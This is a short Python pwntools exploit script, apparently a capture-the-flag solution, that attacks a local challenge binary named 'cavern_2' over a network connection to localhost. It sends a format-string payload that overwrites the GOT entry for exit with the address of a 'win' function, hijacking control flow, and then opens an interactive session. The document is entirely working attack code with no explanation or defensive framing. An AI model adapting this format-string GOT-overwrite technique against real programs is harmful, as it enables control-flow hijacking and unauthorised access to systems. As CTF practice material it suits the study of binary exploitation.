from pwn import *

elf = ELF("./cavern_2")

context.binary = elf
context.log_level = "debug"

io = remote("localhost", 7072)
exit_got = elf.got["exit"]
win = elf.sym["win"]
payload = fmtstr_payload(6, { exit_got: win })
io.sendline(payload)
io.interactive()
